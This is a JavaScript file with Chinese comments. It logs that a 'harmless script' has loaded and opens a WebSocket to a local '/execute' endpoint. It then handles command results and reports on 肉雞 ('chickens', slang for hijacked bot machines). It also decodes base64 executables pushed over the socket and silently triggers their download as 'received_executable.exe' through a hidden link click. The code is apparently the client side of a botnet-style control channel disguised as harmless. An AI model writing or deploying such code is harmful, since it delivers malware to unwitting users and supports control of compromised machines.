console.log("無害腳本已加載");

// 設置 WebSocket 連接
const ws = new WebSocket("ws://127.0.0.1:5000/execute");

// 監聽 WebSocket 連接事件
ws.onopen = function() {
    console.log("WebSocket 連接成功");
};

// 監聽 WebSocket 消息事件
ws.onmessage = function(event) {
    try {
        const data = JSON.parse(event.data); // 將消息內容解析為 JSON
        console.log("收到消息:", data);

        // 當接收到執行結果時
        if (data.type === 'execution_result') {
            console.log("執行結果:", data.result); // 處理執行結果
        }

        // 當接收到可執行文件時
        if (data.type === 'executable' && data.data) {
            const exeDataBase64 = data.data; // 獲取可執行文件的 base64 數據
            const byteCharacters = atob(exeDataBase64); // 解碼 base64 字符串
            const byteNumbers = new Uint8Array(byteCharacters.length); // 創建 Uint8Array
            for (let i = 0; i < byteCharacters.length; i++) {
                byteNumbers[i] = byteCharacters.charCodeAt(i); // 將字符轉換為字節
            }
            const blob = new Blob([byteNumbers], { type: 'application/octet-stream' }); // 創建 Blob
            const url = URL.createObjectURL(blob); // 創建下載 URL
            const a = document.createElement('a');
            a.href = url;
            a.download = 'received_executable.exe'; // 設置下載的文件名
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            console.log('可執行文件已下載');
        }

        // 當接收到肉雞訊息時
        if (data.type === 'chicken_info') {
            console.log("收到肉雞訊息:", data);
            // 可以在這裡進行進一步處理
        }

    } catch (error) {
        console.error("解析消息失敗:", error);
    }
};

// 監聽 WebSocket 錯誤
ws.onerror = (error) => {
    console.error("WebSocket 錯誤:", error);
};

// 監聽 WebSocket 關閉
ws.onclose = (event) => {
    console.log("WebSocket 關閉:", event.code, event.reason);
};